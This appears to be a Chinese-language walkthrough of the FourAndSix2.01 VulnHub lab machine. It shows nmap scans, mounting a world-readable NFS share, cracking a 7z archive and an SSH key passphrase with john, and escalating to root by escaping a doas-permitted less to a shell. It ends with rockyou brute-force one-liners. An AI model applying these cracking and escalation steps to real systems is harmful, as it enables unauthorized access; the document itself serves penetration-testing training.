# FourandSix2.01主机渗透实现

- 靶机地址：https://www.vulnhub.com/entry/fourandsix-201,266/
- 下载地址：https://download.vulnhub.com/fourandsix/FourAndSix2.ova



## 信息收集：

### 主机发现

- 当前主机IP段192.168.2.0/24，主机IP为：192.168.2.2

```shell
└─$ sudo nmap -sn --min-rate 10000 192.168.2.1/24
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-01 22:33 EDT
Nmap scan report for 192.168.2.1
Host is up (0.011s latency).
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.2.4
Host is up (0.0012s latency).
MAC Address: 00:0C:29:48:57:CF (VMware)
Nmap scan report for 192.168.2.254
Host is up (0.00014s latency).
MAC Address: 00:50:56:E8:9F:92 (VMware)
Nmap scan report for 192.168.2.2
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 13.34 seconds
```

- 靶机IP为`192.168.2.4`



### 端口扫描

- TCP扫描

```shell
└─$ sudo nmap -sT --min-rate 10000 192.168.2.4 -oA TcpPort
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-01 22:36 EDT
Nmap scan report for 192.168.2.4
Host is up (0.015s latency).
Not shown: 888 filtered tcp ports (no-response), 109 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
111/tcp  open  rpcbind
2049/tcp open  nfs
MAC Address: 00:0C:29:48:57:CF (VMware)

Nmap done: 1 IP address (1 host up) scanned in 8.80 seconds 
```

- UDP扫描

```SHELL
└─$ sudo nmap -sU --min-rate 10000 192.168.2.4 -oA UdpPort
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-01 22:38 EDT
Nmap scan report for 192.168.2.4
Host is up (0.049s latency).
Not shown: 936 open|filtered udp ports (no-response), 62 closed udp ports (port-unreach)
PORT     STATE SERVICE
111/udp  open  rpcbind
2049/udp open  nfs
MAC Address: 00:0C:29:48:57:CF (VMware)

Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds
```



### 服务及系统探测

```shell
└─$ sudo nmap -sC -sV -O -p22,111,2049 192.168.2.4 -oA sC  
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-01 22:40 EDT
Nmap scan report for 192.168.2.4
Host is up (0.00045s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 ef:3b:2e:cf:40:19:9e:bb:23:1e:aa:24:a1:09:4e:d1 (RSA)
|   256 c8:5c:8b:0b:e1:64:0c:75:c3:63:d7:b3:80:c9:2f:d2 (ECDSA)
|_  256 61:bc:45:9a:ba:a5:47:20:60:13:25:19:b0:47:cb:ad (ED25519)
111/tcp  open  rpcbind 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3         2049/tcp   nfs
|   100003  2,3         2049/udp   nfs
|   100005  1,3          966/udp   mountd
|_  100005  1,3          988/tcp   mountd
2049/tcp open  nfs     2-3 (RPC #100003)
MAC Address: 00:0C:29:48:57:CF (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: OpenBSD 6.X
OS CPE: cpe:/o:openbsd:openbsd:6
OS details: OpenBSD 6.0 - 6.4
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.12 seconds

```



### 默认脚本扫描

```shell
└─$ sudo nmap --script=vuln -p22,111,2049 192.168.2.4 -oA Script
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-12 21:02 EDT
Nmap scan report for 192.168.2.4
Host is up (0.00051s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
111/tcp  open  rpcbind
2049/tcp open  nfs
MAC Address: 00:0C:29:48:57:CF (VMware)

Nmap done: 1 IP address (1 host up) scanned in 31.12 seconds
```

- 没有扫描到有效信息，尝试进行`nfs`端口测试



## nfs渗透测试

- 使用`rpcinfo -p 192.168.2.4` 参数来进行检测当前主机rpc服务运行情况

- ```shell
  └─$ rpcinfo -p 192.168.2.4  
     program vers proto   port  service
      100000    2   tcp    111  portmapper
      100000    2   udp    111  portmapper
      100005    1   udp    966  mountd
      100005    3   udp    966  mountd
      100005    1   tcp    988  mountd
      100005    3   tcp    988  mountd
      100003    2   udp   2049  nfs
      100003    3   udp   2049  nfs
      100003    2   tcp   2049  nfs
      100003    3   tcp   2049  nfs
  ```

- 查看当前主机挂载目录`showmount -e 192.168.2.4 ` 

- ```shell
  └─$ showmount -e 192.168.2.4
  Export list for 192.168.2.4:
  /home/user/storage (everyone)
  
  # 当前挂载目录任意用户可进行操作
  ```

- 挂载当前目录到本机，使用`mount -t nfs`来指定需要mount的类型，类型指定为

- ```shell
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/FourandSix2.01]
  └─$ mkdir remotemount   
                                 
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/FourandSix2.01]
  └─$ sudo mount -t nfs 192.168.2.4:/home/user/storage ./remotemount
  Created symlink /run/systemd/system/remote-fs.target.wants/rpc-statd.service → /lib/systemd/system/rpc-statd.service.
  ```

- 查看当前挂载文件

- ```shell
  └─$ ls -lhai   
  total 234K
   129929 drwxr-xr-x 6 kali kali  512 Aug  3 08:43 .
  4458625 drwxr-xr-x 4 kali kali 4.0K Aug 12 21:29 ..
   129930 -rw-r--r-- 1 kali kali  61K Oct 29  2018 backup.7z
   129940 drwxrwxrwt 2 kali kali  512 Aug  3 08:42 .ICE-unix
   129933 -rw------- 1 kali kali    0 Aug  2 07:03 qterminal.HKZUQB
   129947 -rw------- 1 kali kali 152K Aug  3 08:43 qterminal.hLZsum
   129931 -rw------- 1 kali kali    0 Aug  2 07:03 qterminal.jjccgs
   129948 -rw------- 1 kali kali  131 Aug  3 08:43 qterminal.JNeWkn
   129946 -rw------- 1 kali kali  524 Aug  3 08:43 qterminal.taHRrA
   129932 -rw------- 1 kali kali    0 Aug  2 07:03 qterminal.yiCCtm
   129938 drwx------ 2 kali kali  512 Aug  3 08:43 ssh-4D78GLlsjj0w
   129937 drwx------ 2 kali kali  512 Aug  3 08:29 vmware-root_466-835429964
   129935 drwxrwxrwt 2 kali kali  512 Aug  3 08:43 .X11-unix
   129942 -rw------- 1 kali kali  406 Aug  3 08:42 .xfsm-ICE-BP5281
   
  ```

- 将文件全部下载到本地，依次查看是否具有有效信息，如果文件过大或会引起目标警觉时，可选择性进行下载

- ```shell
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/FourandSix2.01]
  └─$ mkdir tmp                                                
        
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/FourandSix2.01/remotemount]
  └─$ cp -r ./* ../tmp/
  
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/FourandSix2.01/tmp]
  └─$ ls -lhai 
  total 240K
  4458679 drwxr-xr-x 4 kali kali 4.0K Aug 12 21:47 .
  4458625 drwxr-xr-x 5 kali kali 4.0K Aug 12 21:46 ..
  4458681 -rw-r--r-- 1 kali kali  61K Aug 12 21:47 backup.7z
  4458683 -rw------- 1 kali kali    0 Aug 12 21:47 qterminal.HKZUQB
  4458687 -rw------- 1 kali kali 152K Aug 12 21:47 qterminal.hLZsum
  4458688 -rw------- 1 kali kali    0 Aug 12 21:47 qterminal.jjccgs
  4458689 -rw------- 1 kali kali  131 Aug 12 21:47 qterminal.JNeWkn
  4458690 -rw------- 1 kali kali  524 Aug 12 21:47 qterminal.taHRrA
  4458691 -rw------- 1 kali kali    0 Aug 12 21:47 qterminal.yiCCtm
  4458692 drwx------ 2 kali kali 4.0K Aug 12 21:47 ssh-4D78GLlsjj0w
  4458693 drwx------ 2 kali kali 4.0K Aug 12 21:47 vmware-root_466-835429964
  ```

- 尝试解压`backup.7z`文件，删除不必要的文件,使用`x`参数来进行解压

- ```shell
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/FourandSix2.01/tmp]
  └─$ rm -rf qterminal.*                                                                             
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/FourandSix2.01/tmp]
  └─$ rm -rf ssh-4D78GLlsjj0w 
  
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/FourandSix2.01/tmp]
  └─$ rm -rf vmware-root_466-835429964                                                                                                        
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/FourandSix2.01/tmp]
  └─$ ls      
  backup.7z                                                                                                     
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/FourandSix2.01/tmp]
  └─$ 7z x backup.7z 
   
  7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
  p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs Intel(R) Core(TM) i5-10500 CPU @ 3.10GHz (A0653),ASM,AES-NI)
  
  Scanning the drive for archives:
  1 file, 62111 bytes (61 KiB)
  
  Extracting archive: backup.7z
  --
  Path = backup.7z
  Type = 7z
  Physical Size = 62111
  Headers Size = 303
  Method = LZMA2:16 7zAES
  Solid = +
  Blocks = 1
  
      
  Enter password (will not be echoed):
  ERROR: Data Error in encrypted file. Wrong password? : hello1.jpeg
  ERROR: Data Error in encrypted file. Wrong password? : hello2.png
  ERROR: Data Error in encrypted file. Wrong password? : hello3.jpeg
  ERROR: Data Error in encrypted file. Wrong password? : hello4.png
  ERROR: Data Error in encrypted file. Wrong password? : hello5.jpeg
  ERROR: Data Error in encrypted file. Wrong password? : hello6.png
  ERROR: Data Error in encrypted file. Wrong password? : hello7.jpeg
  ERROR: Data Error in encrypted file. Wrong password? : hello8.jpeg
  ERROR: Data Error in encrypted file. Wrong password? : id_rsa
  ERROR: Data Error in encrypted file. Wrong password? : id_rsa.pub
                   
  Sub items Errors: 10
  
  Archives with Errors: 1
  
  Sub items Errors: 10
  ```

### hash密码碰撞

- 查找文件中并不存在密码信息，使用`7z2join`来进行生成hash值，之后使用`john`来进行破解

- ```shell
  └─$ 7z2john backup.7z > backup.7z.hash
  ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
  
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/FourandSix2.01/tmp]
  └─$ john --show backup.7z.hash 
  backup.7z:chocolate
  
  1 password hash cracked, 0 lef
  ```

- 成功使用密码`chocolate`解开文件，查看文件信息

- ```SHELL
  └─$ ls -lhai
  total 180K
  4458679 drwxr-xr-x 2 kali kali 4.0K Aug 12 23:50 .
  4458625 drwxr-xr-x 5 kali kali 4.0K Aug 12 21:46 ..
  4458681 -rw-r--r-- 1 kali kali  61K Aug 12 21:47 backup.7z
  4458688 -rw-r--r-- 1 kali kali  19K Aug 12 23:49 backup.7z.hash
  4458687 -rw-r--r-- 1 kali kali 8.8K Oct 28  2018 hello1.jpeg
  4458691 -rw-r--r-- 1 kali kali 5.2K Oct 28  2018 hello2.png
  4458692 -rw-r--r-- 1 kali kali 8.7K Oct 28  2018 hello3.jpeg
  4458693 -rw-r--r-- 1 kali kali 8.2K Oct 28  2018 hello4.png
  4458725 -rw-r--r-- 1 kali kali 9.9K Oct 28  2018 hello5.jpeg
  4458852 -rw-r--r-- 1 kali kali 5.8K Oct 28  2018 hello6.png
  4458873 -rw-r--r-- 1 kali kali 6.1K Oct 28  2018 hello7.jpeg
  4458965 -rw-r--r-- 1 kali kali 8.0K Oct 28  2018 hello8.jpeg
  4459281 -rw------- 1 kali kali 1.9K Oct 28  2018 id_rsa
  4459289 -rw-r--r-- 1 kali kali  398 Oct 28  2018 id_rsa.pub
  ```

- 经过查看图片并没有隐写或其他信息，尝试使用密钥进行登录服务器

- ```shell
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/FourandSix2.01/tmp]
  └─$ file hello*.*   
  hello1.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 258x195, components 3
  hello2.png:  PNG image data, 257 x 196, 8-bit colormap, non-interlaced
  hello3.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 227x222, components 3
  hello4.png:  PNG image data, 206 x 244, 8-bit colormap, non-interlaced
  hello5.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 226x223, components 3
  hello6.png:  PNG image data, 177 x 232, 8-bit colormap, non-interlaced
  hello7.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 282x179, components 3
  hello8.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 204x248, components 3
  
  ```

- 使用密钥登陆服务器时需要填写密钥的密码。使用`ssh2join`尝试进行破解

- ```shell
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/FourandSix2.01/tmp]
  └─$ ssh2john id_rsa > id_rsa.hash                                                                                          
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/FourandSix2.01/tmp]
  └─$ john --format=ssh id_rsa.hash 
  Using default input encoding: UTF-8
  Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
  No password hashes left to crack (see FAQ)                                                                                                       
  ┌──(kali㉿kali)-[~/Desktop/walkthroughs/FourandSix2.01/tmp]
  └─$ john --show id_rsa.hash      
  id_rsa:12345678
  
  1 password hash cracked, 0 left
  ```

- 使用密码：`12345678`尝试进行登录

- ```shell
  └─$ ssh -i id_rsa user@192.168.2.4
  Enter passphrase for key 'id_rsa': 
  Enter passphrase for key 'id_rsa': 
  Last login: Mon Aug  7 15:29:19 2023 from 192.168.2.2
  OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018
  
  Welcome to OpenBSD: The proactively secure Unix-like operating system.
  
  Please use the sendbug(1) utility to report bugs in the system.
  Before reporting a bug, please try to reproduce it with the latest
  version of the code.  With bug reports, please try to ensure that
  enough information to reproduce the problem is enclosed, and if a
  known fix for it exists, include that as well.
  
  fourandsix2$ 
  
  ```



## 获得初始shell

```shell
└─$ ssh -i id_rsa user@192.168.2.4
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
Last login: Mon Aug  7 15:29:19 2023 from 192.168.2.2
OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

fourandsix2$ id
uid=1000(user) gid=1000(user) groups=1000(user), 0(wheel)
fourandsix2$ uname -a
OpenBSD fourandsix2.localdomain 6.4 GENERIC#349 amd64
fourandsix2$ ifconfig 
lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> mtu 32768
        index 3 priority 0 llprio 3
        groups: lo
        inet6 ::1 prefixlen 128
        inet6 fe80::1%lo0 prefixlen 64 scopeid 0x3
        inet 127.0.0.1 netmask 0xff000000
em0: flags=8843<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> mtu 1500
        lladdr 00:0c:29:48:57:cf
        index 1 priority 0 llprio 3
        media: Ethernet autoselect (1000baseT full-duplex,master)
        status: active
        inet 192.168.2.4 netmask 0xffffff00 broadcast 192.168.2.255
enc0: flags=0<>
        index 2 priority 0 llprio 3
        groups: enc
        status: active
pflog0: flags=141<UP,RUNNING,PROMISC> mtu 33136
        index 4 priority 0 llprio 3
        groups: pflog
fourandsix2$ 

```



### 提权

- 查找当前用户所属用户组可以读取哪些文件 > `find / -group user -type f 2>/dev/null`

- ```shell
  fourandsix2$ find / -group user -type f 2>/dev/null           
  /home/user/.ssh/authorized_keys
  /home/user/.Xdefaults
  /home/user/.cshrc
  /home/user/.cvsrc
  /home/user/.login
  /home/user/.mailrc
  /home/user/.profile
  /home/user/storage/backup.7z
  /home/user/storage/qterminal.jjccgs
  /home/user/storage/qterminal.yiCCtm
  /home/user/storage/qterminal.HKZUQB
  /home/user/storage/.xfsm-ICE-BP5281
  /home/user/storage/qterminal.taHRrA
  /home/user/storage/qterminal.hLZsum
  /home/user/storage/qterminal.JNeWkn
  /var/mail/user
  fourandsix2$ 
  ```

- 查找当前用户可操作具有s位文件 > `find / -perm -u=s -type f 2>/dev/null`

- ```shell
  fourandsix2$ find / -perm -u=s -type f 2>/dev/null   
  /usr/bin/chfn
  /usr/bin/chpass
  /usr/bin/chsh
  /usr/bin/doas
  /usr/bin/lpr
  /usr/bin/lprm
  /usr/bin/passwd
  /usr/bin/su
  /usr/libexec/lockspool
  /usr/libexec/ssh-keysign
  /usr/sbin/authpf
  /usr/sbin/authpf-noip
  /usr/sbin/pppd
  /usr/sbin/traceroute
  /usr/sbin/traceroute6
  /sbin/ping
  /sbin/ping6
  /sbin/shutdown
  fourandsix2$ cat /etc/doas.conf                                 
  permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog
  permit nopass keepenv root as root
  fourandsix2$ 
  ```

- 查看`doas`配置文件时发现以下语句，尝试使用`doas`来进行提权，

- ```shell
  fourandsix2$ cat /etc/doas.conf                                                                    
  permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog
  permit nopass keepenv root as root
  ```

- 使用命令：`doas /usr/bin/less /var/log/authlog`

- ![image-20230813143304031](https://raw.githubusercontent.com/r0o983/images/main/202308131617301.png)

- 操作步骤：

  1. 使用`v`键进入编辑模式
  2. 接着输入`:!sh`启动一个新的bash环境，即可完成提权

- 提权成功。 enjoy！

- ```shell
  fourandsix2# whoami
  root
  fourandsix2# ifconfig
  lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> mtu 32768
          index 3 priority 0 llprio 3
          groups: lo
          inet6 ::1 prefixlen 128
          inet6 fe80::1%lo0 prefixlen 64 scopeid 0x3
          inet 127.0.0.1 netmask 0xff000000
  em0: flags=8843<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> mtu 1500
          lladdr 00:0c:29:48:57:cf
          index 1 priority 0 llprio 3
          media: Ethernet autoselect (1000baseT full-duplex,master)
          status: active
          inet 192.168.2.4 netmask 0xffffff00 broadcast 192.168.2.255
  enc0: flags=0<>
          index 2 priority 0 llprio 3
          groups: enc
          status: active
  pflog0: flags=141<UP,RUNNING,PROMISC> mtu 33136
          index 4 priority 0 llprio 3
          groups: pflog
  fourandsix2# id 
  uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
  fourandsix2# cd /root/                                                                                                                                                                                                                     
  fourandsix2# ls
  .Xdefaults .cshrc     .cvsrc     .forward   .login     .profile   .ssh       flag.txt
  fourandsix2# cat flag.txt                                                                                                                                                                                                                  
  Nice you hacked all the passwords!
  
  Not all tools worked well. But with some command magic...:
  cat /usr/share/wordlists/rockyou.txt|while read line; do 7z e backup.7z -p"$line" -oout; if grep -iRl SSH; then echo $line; break;fi;done
  
  cat /usr/share/wordlists/rockyou.txt|while read line; do if ssh-keygen -p -P "$line" -N password -f id_rsa; then echo $line; break;fi;done
  
  
  Here is the flag:
  acd043bc3103ed3dd02eee99d5b0ff42
  fourandsix2# 
  
  ```

- 